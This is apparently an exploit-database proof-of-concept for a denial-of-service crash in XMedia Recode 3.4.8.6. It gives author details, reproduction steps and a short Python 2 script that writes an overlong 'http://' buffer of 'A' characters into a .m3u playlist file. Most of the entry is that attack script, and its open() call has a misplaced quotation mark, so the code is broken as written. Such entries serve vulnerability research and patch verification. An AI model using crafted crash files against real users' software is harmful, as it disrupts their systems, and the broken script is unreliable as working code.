#Exploit Title: XMedia Recode 3.4.8.6 - '.m3u' Denial Of Service
#Exploit Author : ZwX
#Exploit Date: 2019-11-18
#Vendor Homepage : https://www.xmedia-recode.de/
#Link Software : https://www.xmedia-recode.de/download.php
#Tested on OS: Windows 7
#Social: twitter.com/ZwX2a
#contact: msk4@live.fr

'''
Proof of Concept (PoC):
=======================

1.Download and install XMedia Recode 
2.Run the python operating script that will create a file (poc.m3u)
3.Run the software "File -> Open File -> Add the file (.m3u) "
4.XMedia Recode Crashed
'''

#!/usr/bin/python

http = "http://" 
buffer = "\x41" * 500 

poc = http + buffer
file = open("poc.m3u,"w")
file.write(poc)
file.close()

print "POC Created by ZwX"